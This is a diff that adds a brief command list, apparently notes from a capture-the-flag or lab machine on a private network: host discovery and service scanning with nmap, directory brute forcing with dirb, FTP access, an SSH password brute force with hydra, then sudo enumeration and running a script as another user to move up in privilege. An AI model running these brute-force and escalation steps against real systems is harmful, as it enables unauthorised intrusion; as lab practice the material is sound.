@@ -1,0 +1,17 @@
+ifconfig
+
+nmap -sn 192.168.56.0/24
+
+nmap -sC -sV -Pn -vv 192.168.56.104
+
+dirb http://192.168.56.104 wordlist.txt -X .php,.html,.txt
+
+ftp 192.168.56.104
+
+hydra -l robin -P p_lists.txt ssh://192.168.56.104
+
+ssh robin@192.168.56.104
+
+sudo -l
+
+sudo -u jerry /home/robin/project/feedback.sh
